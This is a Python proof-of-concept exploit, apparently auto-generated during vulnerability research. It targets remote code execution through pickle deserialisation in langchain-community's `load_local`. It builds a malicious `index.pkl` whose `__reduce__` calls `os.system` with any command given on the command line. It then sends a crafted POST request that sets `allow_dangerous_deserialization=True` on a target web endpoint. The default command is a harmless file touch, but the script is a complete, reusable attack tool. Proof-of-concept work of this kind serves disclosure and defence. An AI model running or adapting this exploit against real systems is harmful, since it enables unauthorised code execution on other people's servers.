#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: load_local
# Auto-generated — run with: python3 rce_true_caller_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community's `load_local` function.

The vulnerability exists in `langchain_community/vectorstores/annoy.py` (and similar).
`load_local` accepts a `folder_path` and `allow_dangerous_deserialization` boolean.
If the boolean is `True`, it deserialises `folder_path/index.pkl` using `pickle.load`,
which can execute arbitrary code. The library does not validate `folder_path`, so an
attacker can point it to a directory containing a malicious pickle file (e.g. placed
via a separate file upload or path traversal). If a downstream web application sets
`allow_dangerous_deserialization=True` and passes user‑controlled `folder_path`, RCE
is achieved.

This script:
1. Creates a benign malicious pickle (default: `touch /tmp/poc_success.txt`) in a
   folder (locally or on the target if the filesystem is shared).
2. Sends a crafted POST request to a simulated web endpoint, setting the
   `folder_path` and `allow_dangerous_deserialization=True`.
3. Prints the server response.

Usage:
    python3 poc.py --target http://target:8000

For a remote target, the malicious pickle must already exist at the path you supply
(e.g. by a prior file upload). The script creates it locally for convenience when
testing against a local server (localhost) or when the target filesystem is shared.
"""

import os
import sys
import pickle
import argparse
import requests
import tempfile
import shutil


# ------------------------------------------------------------------------------
# Malicious pickle construction
# ------------------------------------------------------------------------------
class MaliciousPickle:
    """
    Class whose `__reduce__` method returns a call to os.system.
    When unpickled, the command defined at creation time is executed.
    """
    def __init__(self, cmd: str):
        self.cmd = cmd

    def __reduce__(self):
        # pickle will call os.system(self.cmd) to reconstruct this object
        return (os.system, (self.cmd,))


def create_malicious_pickle(output_dir: str, command: str) -> str:
    """
    Create the file `index.pkl` inside `output_dir`. The pickle data is a tuple
    (malicious_instance, {}, {}) mimicking the expected return of `load_local`.
    Also creates a dummy `index.annoy` to avoid a secondary error (optional).

    Returns the path to the folder containing the malicious file.
    """
    os.makedirs(output_dir, exist_ok=True)

    # The malicious instance – on unpickling it will run `command`
    evil = MaliciousPickle(command)

    # The function returns three values: docstore, index_to_docstore_id, config_object
    payload = (evil, {}, {})

    pkl_path = os.path.join(output_dir, "index.pkl")
    with open(pkl_path, "wb") as f:
        pickle.dump(payload, f)

    # Dummy index.annoy; the subsequent load will fail, but the RCE has already fired
    annoy_path = os.path.join(output_dir, "index.annoy")
    with open(annoy_path, "w") as f:
        f.write("")

    print(f"[+] Malicious pickle written to {pkl_path}")
    return output_dir


# ------------------------------------------------------------------------------
# Exploit delivery
# ------------------------------------------------------------------------------
def send_exploit(
    target_url: str,
    endpoint: str,
    folder_path: str,
    param_folder: str,
    param_dangerous: str,
) -> None:
    """
    Sends a POST request to the target web endpoint with the folder_path and
    allow_dangerous_deserialization=True.
    """
    url = target_url.rstrip("/") + endpoint
    params = {
        param_folder: folder_path,
        param_dangerous: True,
    }
    print(f"[*] Sending request to {url}")
    print(f"[*] Body: {params}")

    try:
        resp = requests.post(url, json=params, timeout=10)
        print(f"[+] Response status: {resp.status_code}")
        print(f"[+] Response (first 500 bytes): {resp.text[:500]}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)


# ------------------------------------------------------------------------------
# Main
# ------------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC: RCE in langchain-community load_local via malicious pickle"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Base URL of the target (e.g. http://localhost:8000)",
    )
    parser.add_argument(
        "--endpoint",
        default="/api/v1/trigger",
        help="Endpoint that triggers load_local (default: /api/v1/trigger)",
    )
    parser.add_argument(
        "--param-folder",
        default="folder_path",
        help="Name of the POST parameter for folder_path (default: folder_path)",
    )
    parser.add_argument(
        "--param-dangerous",
        default="allow_dangerous_deserialization",
        help="Name of the POST parameter for the boolean flag (default: allow_dangerous_deserialization)",
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (benign by default)",
    )
    parser.add_argument(
        "--folder",
        default="/tmp/exploit_poc",
        help="Directory that will be used as folder_path on the target (must be writable)",
    )

    args = parser.parse_args()

    # --- Step 1: Create the malicious pickle ---
    # For local testing (e.g. target on localhost) this writes directly to the
    # filesystem. For remote targets the attacker must have placed the pickle
    # beforehand (e.g. via a file upload vulnerability). The script assumes it
    # already exists at the given folder path.
    print("[*] Creating malicious pickle (locally)")
    create_malicious_pickle(args.folder, args.command)

    # --- Step 2: Send the exploit request ---
    send_exploit(
        target_url=args.target,
        endpoint=args.endpoint,
        folder_path=args.folder,
        param_folder=args.param_folder,
        param_dangerous=args.param_dangerous,
    )

    # --- Optional cleanup (uncomment to remove local pickle) ---
    # shutil.rmtree(args.folder, ignore_errors=True)
    # print(f"[*] Cleaned up local folder {args.folder}")


if __name__ == "__main__":
    main()
